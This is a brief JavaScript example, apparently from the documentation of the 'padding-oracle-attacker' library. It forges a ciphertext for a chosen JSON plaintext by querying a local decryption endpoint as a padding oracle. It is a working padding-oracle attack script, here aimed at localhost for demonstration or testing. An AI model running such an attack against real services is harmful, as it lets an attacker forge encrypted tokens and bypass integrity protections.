import { encrypt } from 'padding-oracle-attacker';

const json = { foo: 1, bar: { baz: 1337 } };
const txt = JSON.stringify(json);
const plaintext = Buffer.from(txt, 'utf8');

encrypt({
  url: 'http://localhost:2020/decrypt?ciphertext=',
  blockSize: 16,
  plaintext,
  isDecryptionSuccess: ({ statusCode }) => statusCode !== 400,
}).catch(console.error);
